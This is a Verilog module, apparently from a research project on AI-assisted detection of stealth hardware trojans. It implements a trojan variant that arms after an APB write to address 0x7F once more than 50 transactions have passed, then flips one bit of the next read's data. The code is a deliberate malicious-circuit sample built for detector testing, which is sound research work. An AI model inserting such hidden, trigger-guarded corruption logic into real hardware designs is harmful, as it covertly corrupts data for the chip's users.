// =============================================================================
// Module  : stealth_trojan_b
// Project : AI-Assisted Stealth Hardware Trojan Detection
// Purpose : Variant B - Subtle 1-bit corruption with temporal guard
// =============================================================================

module stealth_trojan_b (
    input  wire        PCLK,
    input  wire        PRESETn,
    input  wire [7:0]  PADDR,
    input  wire [7:0]  PWDATA,
    input  wire        PWRITE,
    input  wire        PENABLE,
    input  wire [8:0]  cycle_count,
    input  wire [7:0]  normal_prdata,
    output reg  [7:0]  trojan_prdata,
    output reg         trojan_active
);

    localparam [7:0] SECRET_KEY_B = 8'h01; // 1-bit flip
    reg [7:0] trans_count;

    always @(posedge PCLK) begin
        if (!PRESETn)
            trans_count <= 8'd0;
        else if (PENABLE && trans_count < 8'd255)
            trans_count <= trans_count + 8'd1;
    end

    wire trigger_fire_b = (PADDR     == 8'h7F)   &&
                          (PWRITE    == 1'b1)    &&
                          (trans_count > 8'd50)  &&
                          (PENABLE   == 1'b1);

    reg trojan_armed;

    always @(posedge PCLK) begin
        if (!PRESETn) begin
            trojan_armed  <= 1'b0;
            trojan_active <= 1'b0;
        end else begin
            if (trigger_fire_b) begin
                trojan_armed  <= 1'b1;
                trojan_active <= 1'b0;
            end else if (trojan_armed && PENABLE && !PWRITE) begin
                trojan_active <= 1'b1;
                trojan_armed  <= 1'b0;
            end else begin
                trojan_active <= 1'b0;
            end
        end
    end

    always @(*) begin
        if (trojan_active)
            trojan_prdata = normal_prdata ^ SECRET_KEY_B;
        else
            trojan_prdata = normal_prdata;
    end

endmodule
